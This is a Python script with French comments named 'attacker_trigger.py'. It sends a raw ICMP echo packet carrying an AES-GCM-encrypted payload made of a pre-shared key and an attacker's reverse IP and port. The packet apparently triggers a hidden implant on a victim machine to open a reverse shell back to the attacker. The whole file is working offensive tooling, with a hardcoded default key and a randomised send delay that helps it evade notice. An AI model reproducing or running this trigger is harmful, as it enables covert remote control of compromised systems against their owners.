#!/usr/bin/env python3
"""
attacker_trigger.py - Envoi d’un paquet ICMP déclencheur chiffré avec AES-256-GCM et dérivation de clé via PBKDF2

Usage:
    sudo ./attacker_trigger.py <target_ip> <reverse_ip> <reverse_port> [secret_key]

Si secret_key n'est pas fourni, il utilise la valeur par défaut.
"""

import socket
import struct
import sys
import os
import secrets
import time
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

ICMP_ECHO_REQUEST = 8
DEFAULT_SECRET_KEY = "wA@2mC!dq"  # Doit correspondre à la clé prépartagée (obfusquée côté victime)

def derive_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=2000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

def aes_gcm_encrypt(plaintext: bytes, password: str) -> bytes:
    salt = secrets.token_bytes(16)
    key = derive_key(password, salt)
    iv = secrets.token_bytes(12)
    encryptor = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend()).encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    tag = encryptor.tag
    return salt + iv + ciphertext + tag

def checksum(source_bytes: bytes) -> int:
    count_to = (len(source_bytes) // 2) * 2
    s = 0
    for count in range(0, count_to, 2):
        this_val = source_bytes[count+1] * 256 + source_bytes[count]
        s += this_val
        s &= 0xffffffff
    if count_to < len(source_bytes):
        s += source_bytes[-1]
        s &= 0xffffffff
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    answer = ~s & 0xffff
    return socket.htons(answer)

def create_icmp_packet(secret_key: str, reverse_ip: str, reverse_port: str) -> bytes:
    packet_id = os.getpid() & 0xFFFF
    packet_seq = 1
    payload_str = f"{secret_key} {reverse_ip} {reverse_port}"
    plaintext = payload_str.encode()
    encrypted_payload = aes_gcm_encrypt(plaintext, secret_key)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, packet_id, packet_seq)
    packet = header + encrypted_payload
    chksum = checksum(packet)
    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, packet_id, packet_seq)
    return header + encrypted_payload

def send_icmp_packet(target_ip: str, packet: bytes):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        print("Ce script doit être exécuté en tant qu'administrateur/root.")
        sys.exit(1)
    time.sleep(secrets.randbelow(3))
    sock.sendto(packet, (target_ip, 1))
    sock.close()
    print(f"[+] Paquet ICMP envoyé vers {target_ip}")

def usage():
    print(f"Usage: {sys.argv[0]} <target_ip> <reverse_ip> <reverse_port> [secret_key]")
    sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) < 4:
        usage()
    target_ip = sys.argv[1]
    reverse_ip = sys.argv[2]
    reverse_port = sys.argv[3]
    secret_key = sys.argv[4] if len(sys.argv) >= 5 else DEFAULT_SECRET_KEY
    packet = create_icmp_packet(secret_key, reverse_ip, reverse_port)
    send_icmp_packet(target_ip, packet)
